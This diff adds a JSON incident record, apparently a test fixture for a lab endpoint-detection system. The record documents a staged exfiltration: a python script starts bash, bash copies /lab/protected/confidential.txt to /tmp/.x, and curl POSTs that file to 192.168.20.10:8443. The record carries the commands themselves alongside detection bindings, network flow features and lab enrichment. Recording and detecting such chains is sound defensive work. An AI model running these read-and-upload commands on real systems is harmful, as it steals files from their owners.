@@ -1,0 +1,447 @@
+{
+  "incident": {
+    "schema_version": "1.0",
+    "incident_id": "linux-vm-01:INC-20261115T103007-0001",
+    "incident_version": 1,
+    "endpoint_id": "linux-vm-01",
+    "os": "linux",
+    "status": "open",
+    "detected_at_utc": "2026-11-15T10:30:07.000Z",
+    "updated_at_utc": "2026-11-15T10:30:07.000Z",
+    "severity": "high",
+    "confidence": "high",
+    "title": "python3 \u2192 bash \u2192 read /lab/protected/confidential.txt \u2192 curl to 192.168.20.10:8443",
+    "rule_matches": [
+      {
+        "rule_id": "NX-LIN-001",
+        "rule_version": "1.0",
+        "matched_at_utc": "2026-11-15T10:30:07.000Z",
+        "bindings": {
+          "interp": "linux-vm-01:evt-000000000001",
+          "shell": "linux-vm-01:evt-000000000002",
+          "read": "linux-vm-01:evt-000000000004",
+          "net": "linux-vm-01:evt-000000000007"
+        }
+      }
+    ],
+    "technique_ids": [
+      "T1059.004",
+      "T1005",
+      "T1041"
+    ],
+    "root_process_instance_id": "linux-vm-01:exec-py01",
+    "process_nodes": [
+      {
+        "process_instance_id": "linux-vm-01:exec-py01",
+        "parent_process_instance_id": "linux-vm-01:exec-systemd-user",
+        "pid": 4210,
+        "binary": "/usr/bin/python3",
+        "command_line": "python3 /lab/scenarios/l1_stage_and_send.py",
+        "user": "lab",
+        "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+        "start_time_utc": "2026-11-15T10:30:01.120Z",
+        "placeholder": false,
+        "role": "root"
+      },
+      {
+        "process_instance_id": "linux-vm-01:exec-bash01",
+        "parent_process_instance_id": "linux-vm-01:exec-py01",
+        "pid": 4211,
+        "binary": "/usr/bin/bash",
+        "command_line": "bash -c cat /lab/protected/confidential.txt > /tmp/.x",
+        "user": "lab",
+        "sha256": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+        "start_time_utc": "2026-11-15T10:30:02.005Z",
+        "placeholder": false,
+        "role": "matched"
+      },
+      {
+        "process_instance_id": "linux-vm-01:exec-cat01",
+        "parent_process_instance_id": "linux-vm-01:exec-bash01",
+        "pid": 4212,
+        "binary": "/usr/bin/cat",
+        "command_line": "cat /lab/protected/confidential.txt",
+        "user": "lab",
+        "sha256": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc",
+        "start_time_utc": "2026-11-15T10:30:02.030Z",
+        "end_time_utc": "2026-11-15T10:30:02.060Z",
+        "placeholder": false,
+        "role": "matched"
+      },
+      {
+        "process_instance_id": "linux-vm-01:exec-curl01",
+        "parent_process_instance_id": "linux-vm-01:exec-bash01",
+        "pid": 4215,
+        "binary": "/usr/bin/curl",
+        "command_line": "curl -s -X POST --data-binary @/tmp/.x http://192.168.20.10:8443/upload",
+        "user": "lab",
+        "sha256": "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd",
+        "start_time_utc": "2026-11-15T10:30:05.900Z",
+        "placeholder": false,
+        "role": "matched"
+      }
+    ],
+    "relationships": [
+      {
+        "type": "PARENT_OF",
+        "from": "linux-vm-01:exec-py01",
+        "to": "linux-vm-01:exec-bash01",
+        "basis": "observed",
+        "evidence_event_ids": [
+          "linux-vm-01:evt-000000000002"
+        ]
+      },
+      {
+        "type": "PARENT_OF",
+        "from": "linux-vm-01:exec-bash01",
+        "to": "linux-vm-01:exec-cat01",
+        "basis": "observed",
+        "evidence_event_ids": [
+          "linux-vm-01:evt-000000000003"
+        ]
+      },
+      {
+        "type": "PARENT_OF",
+        "from": "linux-vm-01:exec-bash01",
+        "to": "linux-vm-01:exec-curl01",
+        "basis": "observed",
+        "evidence_event_ids": [
+          "linux-vm-01:evt-000000000006"
+        ]
+      },
+      {
+        "type": "ACCESSED_FILE",
+        "from": "linux-vm-01:exec-cat01",
+        "to": "file:/lab/protected/confidential.txt",
+        "basis": "observed",
+        "evidence_event_ids": [
+          "linux-vm-01:evt-000000000004"
+        ]
+      },
+      {
+        "type": "CONNECTED_TO",
+        "from": "linux-vm-01:exec-curl01",
+        "to": "net:192.168.20.10:8443/TCP",
+        "basis": "observed",
+        "evidence_event_ids": [
+          "linux-vm-01:evt-000000000007"
+        ]
+      }
+    ],
+    "evidence": [
+      {
+        "event_id": "linux-vm-01:evt-000000000001",
+        "role": "matched",
+        "event": {
+          "schema_version": "1.0",
+          "event_id": "linux-vm-01:evt-000000000001",
+          "endpoint_id": "linux-vm-01",
+          "os": "linux",
+          "timestamp_utc": "2026-11-15T10:30:01.120Z",
+          "event_type": "process_start",
+          "process_instance_id": "linux-vm-01:exec-py01",
+          "parent_process_instance_id": "linux-vm-01:exec-systemd-user",
+          "pid": 4210,
+          "ppid": 1800,
+          "binary": "/usr/bin/python3",
+          "command_line": "python3 /lab/scenarios/l1_stage_and_send.py",
+          "user": "lab",
+          "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+          "process_start_time_utc": "2026-11-15T10:30:01.120Z",
+          "attributes": {
+            "sensor": "tetragon",
+            "identity_resolution": "native"
+          }
+        }
+      },
+      {
+        "event_id": "linux-vm-01:evt-000000000002",
+        "role": "matched",
+        "event": {
+          "schema_version": "1.0",
+          "event_id": "linux-vm-01:evt-000000000002",
+          "endpoint_id": "linux-vm-01",
+          "os": "linux",
+          "timestamp_utc": "2026-11-15T10:30:02.005Z",
+          "event_type": "process_start",
+          "process_instance_id": "linux-vm-01:exec-bash01",
+          "parent_process_instance_id": "linux-vm-01:exec-py01",
+          "pid": 4211,
+          "ppid": 4210,
+          "binary": "/usr/bin/bash",
+          "command_line": "bash -c cat /lab/protected/confidential.txt > /tmp/.x",
+          "user": "lab",
+          "sha256": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+          "process_start_time_utc": "2026-11-15T10:30:02.005Z",
+          "attributes": {
+            "sensor": "tetragon"
+          }
+        }
+      },
+      {
+        "event_id": "linux-vm-01:evt-000000000003",
+        "role": "context",
+        "event": {
+          "schema_version": "1.0",
+          "event_id": "linux-vm-01:evt-000000000003",
+          "endpoint_id": "linux-vm-01",
+          "os": "linux",
+          "timestamp_utc": "2026-11-15T10:30:02.030Z",
+          "event_type": "process_start",
+          "process_instance_id": "linux-vm-01:exec-cat01",
+          "parent_process_instance_id": "linux-vm-01:exec-bash01",
+          "pid": 4212,
+          "ppid": 4211,
+          "binary": "/usr/bin/cat",
+          "command_line": "cat /lab/protected/confidential.txt",
+          "user": "lab",
+          "sha256": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc",
+          "process_start_time_utc": "2026-11-15T10:30:02.030Z",
+          "attributes": {
+            "sensor": "tetragon"
+          }
+        }
+      },
+      {
+        "event_id": "linux-vm-01:evt-000000000004",
+        "role": "matched",
+        "event": {
+          "schema_version": "1.0",
+          "event_id": "linux-vm-01:evt-000000000004",
+          "endpoint_id": "linux-vm-01",
+          "os": "linux",
+          "timestamp_utc": "2026-11-15T10:30:02.041Z",
+          "event_type": "file_access",
+          "process_instance_id": "linux-vm-01:exec-cat01",
+          "parent_process_instance_id": "linux-vm-01:exec-bash01",
+          "pid": 4212,
+          "ppid": 4211,
+          "binary": "/usr/bin/cat",
+          "user": "lab",
+          "file": {
+            "path": "/lab/protected/confidential.txt",
+            "operation": "read"
+          },
+          "attributes": {
+            "sensor": "tetragon",
+            "sensor_event_id": "security_file_permission"
+          }
+        }
+      },
+      {
+        "event_id": "linux-vm-01:evt-000000000005",
+        "role": "context",
+        "event": {
+          "schema_version": "1.0",
+          "event_id": "linux-vm-01:evt-000000000005",
+          "endpoint_id": "linux-vm-01",
+          "os": "linux",
+          "timestamp_utc": "2026-11-15T10:30:02.060Z",
+          "event_type": "process_exit",
+          "process_instance_id": "linux-vm-01:exec-cat01",
+          "parent_process_instance_id": "linux-vm-01:exec-bash01",
+          "pid": 4212,
+          "ppid": 4211,
+          "binary": "/usr/bin/cat",
+          "attributes": {
+            "sensor": "tetragon"
+          }
+        }
+      },
+      {
+        "event_id": "linux-vm-01:evt-000000000006",
+        "role": "context",
+        "event": {
+          "schema_version": "1.0",
+          "event_id": "linux-vm-01:evt-000000000006",
+          "endpoint_id": "linux-vm-01",
+          "os": "linux",
+          "timestamp_utc": "2026-11-15T10:30:05.900Z",
+          "event_type": "process_start",
+          "process_instance_id": "linux-vm-01:exec-curl01",
+          "parent_process_instance_id": "linux-vm-01:exec-bash01",
+          "pid": 4215,
+          "ppid": 4211,
+          "binary": "/usr/bin/curl",
+          "command_line": "curl -s -X POST --data-binary @/tmp/.x http://192.168.20.10:8443/upload",
+          "user": "lab",
+          "sha256": "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd",
+          "process_start_time_utc": "2026-11-15T10:30:05.900Z",
+          "attributes": {
+            "sensor": "tetragon"
+          }
+        }
+      },
+      {
+        "event_id": "linux-vm-01:evt-000000000007",
+        "role": "matched",
+        "event": {
+          "schema_version": "1.0",
+          "event_id": "linux-vm-01:evt-000000000007",
+          "endpoint_id": "linux-vm-01",
+          "os": "linux",
+          "timestamp_utc": "2026-11-15T10:30:06.000Z",
+          "event_type": "network_connect",
+          "process_instance_id": "linux-vm-01:exec-curl01",
+          "parent_process_instance_id": "linux-vm-01:exec-bash01",
+          "pid": 4215,
+          "ppid": 4211,
+          "binary": "/usr/bin/curl",
+          "user": "lab",
+          "network": {
+            "protocol": "TCP",
+            "src_ip": "192.168.10.10",
+            "src_port": 51542,
+            "dst_ip": "192.168.20.10",
+            "dst_port": 8443,
+            "direction": "outbound"
+          },
+          "attributes": {
+            "sensor": "tetragon",
+            "sensor_event_id": "tcp_connect"
+          }
+        }
+      }
+    ],
+    "connections": [
+      {
+        "connection_id": "conn-000123",
+        "process_instance_id": "linux-vm-01:exec-curl01",
+        "protocol": "TCP",
+        "src_ip": "192.168.10.10",
+        "src_port": 51542,
+        "dst_ip": "192.168.20.10",
+        "dst_port": 8443,
+        "direction": "outbound",
+        "first_seen_utc": "2026-11-15T10:30:06.000Z",
+        "evidence_event_ids": [
+          "linux-vm-01:evt-000000000007"
+        ]
+      }
+    ],
+    "gaps": [],
+    "local_response": {
+      "action": "none",
+      "status": "not_requested"
+    },
+    "related_incident_ids": [],
+    "agent_version": "0.1.0"
+  },
+  "server": {
+    "received_at_utc": "2026-11-15T10:30:07.850Z",
+    "clock_offset_applied_ms": 0.0,
+    "correlations": [
+      {
+        "connection_id": "conn-000123",
+        "state": "matched",
+        "gateway_connection_id": "gw:conn-00500",
+        "score": 2.5,
+        "candidates": [],
+        "basis": "observed",
+        "updated_utc": "2026-11-15T10:30:07.900Z"
+      }
+    ],
+    "network_evidence": [
+      {
+        "gateway_connection": {
+          "gateway_connection_id": "gw:conn-00500",
+          "protocol": "TCP",
+          "orig_src_ip": "192.168.10.10",
+          "orig_src_port": 51542,
+          "orig_dst_ip": "192.168.20.10",
+          "orig_dst_port": 8443,
+          "first_seen_utc": "2026-11-15T10:30:06.012Z",
+          "last_seen_utc": "2026-11-15T10:30:08.100Z",
+          "ingress_interface": "ens-lin",
+          "src_endpoint_id": "linux-vm-01",
+          "dst_endpoint_id": "windows-vm-01",
+          "packets_orig": 9,
+          "bytes_orig": 1812,
+          "packets_reply": 7,
+          "bytes_reply": 614,
+          "state": "closed",
+          "scope": "routed",
+          "flow_ids": [
+            "gw:flow-00500"
+          ]
+        },
+        "flows": [
+          {
+            "flow_id": "gw:flow-00500",
+            "gateway_connection_id": "gw:conn-00500",
+            "capture_interface": "ens-lin",
+            "protocol": 6,
+            "src_ip": "192.168.10.10",
+            "src_port": 51542,
+            "dst_ip": "192.168.20.10",
+            "dst_port": 8443,
+            "first_seen_utc": "2026-11-15T10:30:06.012Z",
+            "last_seen_utc": "2026-11-15T10:30:08.100Z",
+            "application_name": "HTTP",
+            "feature_version": "nf-lite-1",
+            "features": {
+              "protocol": 6,
+              "l4_dst_port": 8443,
+              "in_bytes": 1812,
+              "out_bytes": 614,
+              "in_pkts": 9,
+              "out_pkts": 7,
+              "flow_duration_ms": 2088,
+              "duration_in_ms": 2088,
+              "duration_out_ms": 2010,
+              "tcp_flags": 27,
+              "client_tcp_flags": 27,
+              "server_tcp_flags": 27,
+              "longest_flow_pkt": 1118,
+              "shortest_flow_pkt": 52,
+              "mean_pkt_size": 151.625,
+              "src_to_dst_second_bytes": 867.8160919540229,
+              "dst_to_src_second_bytes": 305.4726368159204,
+              "src_to_dst_avg_throughput": 6942.528735632184,
+              "dst_to_src_avg_throughput": 2352.4904214559388,
+              "num_pkts_up_to_128_bytes": 13,
+              "num_pkts_128_to_256_bytes": 1,
+              "num_pkts_256_to_512_bytes": 1,
+              "num_pkts_512_to_1024_bytes": 0,
+              "num_pkts_1024_to_1514_bytes": 1
+            },
+            "ml": {
+              "label": "benign",
+              "score": 0.07,
+              "threshold": 0.62,
+              "model_version": "ids-rf-001",
+              "feature_version": "nf-lite-1",
+              "predicted_at_utc": "2026-11-15T10:30:23.000Z"
+            },
+            "scope": "routed"
+          }
+        ]
+      }
+    ],
+    "enrichment": [
+      {
+        "indicator_type": "ip_port",
+        "value": "192.168.20.10:8443",
+        "source": "lab-indicators",
+        "verdict": "lab-test",
+        "tags": [
+          "lab-test",
+          "scenario-l1"
+        ],
+        "detail": {},
+        "fetched_utc": "2026-11-15T10:30:07.900Z"
+      },
+      {
+        "indicator_type": "sha256",
+        "value": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+        "source": "malwarebazaar-offline",
+        "verdict": "unknown",
+        "tags": [],
+        "detail": {},
+        "fetched_utc": "2026-11-15T10:30:07.900Z"
+      }
+    ],
+    "response_history": [],
+    "network_alert_ids": []
+  }
+}
